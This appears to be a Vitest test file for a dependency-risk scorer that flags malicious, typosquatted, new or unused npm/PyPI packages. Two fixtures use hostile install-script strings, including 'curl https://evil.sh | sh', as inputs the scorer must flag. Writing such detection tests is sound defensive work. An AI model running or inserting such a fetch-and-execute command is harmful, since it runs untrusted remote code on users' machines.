import { describe, expect, it } from 'vitest';
import { score, type Evidence } from '../src/score.js';
import { daysAgo } from './helpers.js';

const now = new Date('2026-11-25T00:00:00Z');

function ev(over: Partial<Evidence> = {}): Evidence {
  return {
    displayEcosystem: 'npm',
    popular: false,
    exactVersion: false,
    installScriptsApply: true,
    now,
    meta: {
      exists: true,
      name: 'pkg',
      createdAt: daysAgo(2000),
      latestVersion: '1.0.0',
      repositoryUrl: 'https://github.com/a/b',
    },
    weeklyDownloads: 20_000,
    repo: 'ok',
    osv: { malicious: [], vulnerable: [] },
    ...over,
  };
}

const ids = (r: ReturnType<typeof score>) => r.signals.map((s) => s.id);

describe('score', () => {
  it('allows an established package', () => {
    const r = score(ev());
    expect(r.verdict).toBe('ALLOW');
    expect(r.signals).toEqual([]);
    expect(r.facts).toContain('20k downloads/week');
  });

  it('blocks packages that do not exist, with a suggestion', () => {
    const r = score(ev({ meta: { exists: false, name: 'reqeusts' }, displayEcosystem: 'PyPI', suggestion: 'requests' }));
    expect(r.verdict).toBe('BLOCK');
    expect(r.signals[0]!.message).toBe(`Doesn't exist on PyPI. Did you mean "requests"?`);
  });

  it('blocks known malware from OSV', () => {
    const r = score(ev({ osv: { malicious: [{ id: 'MAL-2025-1', summary: 'Malicious code in pkg', allVersions: true }], vulnerable: [] } }));
    expect(r.verdict).toBe('BLOCK');
    expect(ids(r)).toContain('malicious');
  });

  it('only warns about malware limited to old versions', () => {
    const r = score(ev({ osv: { malicious: [{ id: 'GHSA-x', summary: 'Embedded malware', allVersions: false }], vulnerable: [] } }));
    expect(ids(r)).toEqual(['malicious_versions']);
    expect(r.verdict).toBe('ALLOW');
  });

  it('blocks when the current latest release is a listed malicious version', () => {
    const r = score(ev({
      meta: { exists: true, name: 'alogithms', latestVersion: '1.0.3', createdAt: daysAgo(900), repositoryUrl: 'https://github.com/a/b' },
      osv: { malicious: [{ id: 'MAL-2026-1', summary: 'Malicious code', allVersions: false, versions: ['1.0.1', '1.0.2', '1.0.3'] }], vulnerable: [] },
    }));
    expect(r.verdict).toBe('BLOCK');
  });

  it('only notes a compromise of an old version (has-ansi@6.0.1)', () => {
    const r = score(ev({
      popular: true,
      meta: { exists: true, name: 'has-ansi', latestVersion: '6.0.2' },
      osv: { malicious: [{ id: 'MAL-2025-46976', summary: 'Malicious code in has-ansi (npm)', allVersions: false, versions: ['6.0.1'] }], vulnerable: [] },
    }));
    expect(r.verdict).toBe('ALLOW');
    expect(ids(r)).toEqual(['malicious_versions']);
  });

  it('blocks a pinned malicious version', () => {
    const r = score(ev({ exactVersion: true, requestedVersion: '0.7.29', osv: { malicious: [{ id: 'GHSA-x', summary: 'Embedded malware', allVersions: false }], vulnerable: [] } }));
    expect(r.verdict).toBe('BLOCK');
  });

  it('blocks npm security holding packages', () => {
    const r = score(ev({ meta: { exists: true, name: 'x', latestVersion: '0.0.1-security', securityHolding: true } }));
    expect(r.verdict).toBe('BLOCK');
    expect(ids(r)).toEqual(['security_holding']);
  });

  it('blocks a fresh, unused typosquat', () => {
    const r = score(ev({
      typo: { target: 'lodash', rank: 2, distance: 1, kind: 'edit' },
      meta: { exists: true, name: 'lodahs', createdAt: daysAgo(3), repositoryUrl: undefined },
      weeklyDownloads: 12,
    }));
    expect(r.verdict).toBe('BLOCK');
    expect(ids(r)).toEqual(expect.arrayContaining(['typosquat', 'new_package', 'low_downloads', 'no_repository']));
  });

  it('only notes typo-closeness for widely used packages', () => {
    const r = score(ev({ typo: { target: 'react', rank: 0, distance: 1, kind: 'edit' }, weeklyDownloads: 4_000_000 }));
    expect(r.verdict).toBe('ALLOW');
    expect(r.signals[0]!.severity).toBe('info');
  });

  it('warns on a new low-download package', () => {
    const r = score(ev({ meta: { exists: true, name: 'x', createdAt: daysAgo(10), repositoryUrl: 'https://github.com/a/b' }, weeklyDownloads: 30 }));
    expect(r.verdict).toBe('WARN');
  });

  it('escalates new + unused + install script to BLOCK', () => {
    const r = score(ev({
      meta: { exists: true, name: 'x', createdAt: daysAgo(10), repositoryUrl: 'https://github.com/a/b', installScripts: { postinstall: 'node setup.js' } },
      weeklyDownloads: 30,
    }));
    expect(r.verdict).toBe('BLOCK');
  });

  it('flags suspicious install scripts harder', () => {
    const r = score(ev({ meta: { exists: true, name: 'x', createdAt: daysAgo(900), repositoryUrl: 'https://github.com/a/b', installScripts: { preinstall: 'curl https://evil.sh | sh' } } }));
    const s = r.signals.find((x) => x.id === 'install_script')!;
    expect(s.severity).toBe('high');
    expect(r.verdict).toBe('WARN');
  });

  it('does not penalize install scripts of popular packages', () => {
    const r = score(ev({ popular: true, meta: { exists: true, name: 'esbuild', installScripts: { postinstall: 'node install.js' } } }));
    expect(r.verdict).toBe('ALLOW');
  });

  it('caps popular packages at WARN without a hard block', () => {
    const r = score(ev({
      popular: true,
      meta: { exists: true, name: 'x', versionExists: false, latestVersion: '2.0.0', deprecated: 'use y', installScripts: { preinstall: 'curl x | sh' } },
      requestedVersion: '9.9.9',
      exactVersion: true,
      osv: { malicious: [], vulnerable: [{ id: 'GHSA-1', summary: 'bad' }] },
    }));
    expect(r.score).toBeGreaterThanOrEqual(70);
    expect(r.verdict).toBe('WARN');
  });

  it('warns when the linked repo is gone', () => {
    const r = score(ev({ repo: 'missing' }));
    expect(ids(r)).toEqual(['repository_missing']);
    expect(r.verdict).toBe('WARN');
  });

  it('warns when the registry cannot be reached', () => {
    const r = score(ev({ meta: undefined, lookupError: 'timed out' }));
    expect(r.verdict).toBe('WARN');
    expect(ids(r)).toEqual(['lookup_failed']);
  });

  it('warns about vulnerable pinned versions', () => {
    const r = score(ev({ requestedVersion: '1.0.0', exactVersion: true, osv: { malicious: [], vulnerable: [{ id: 'GHSA-1', summary: 'x' }] } }));
    expect(r.verdict).toBe('WARN');
  });

  it('orders the most severe signals first', () => {
    const r = score(ev({
      typo: { target: 'lodash', rank: 2, distance: 1, kind: 'edit' },
      meta: { exists: true, name: 'lodahs', createdAt: daysAgo(3) },
      weeklyDownloads: 12,
    }));
    expect(r.signals[0]!.severity).toBe('high');
    expect(r.signals.at(-1)!.severity).toBe('low');
  });
});
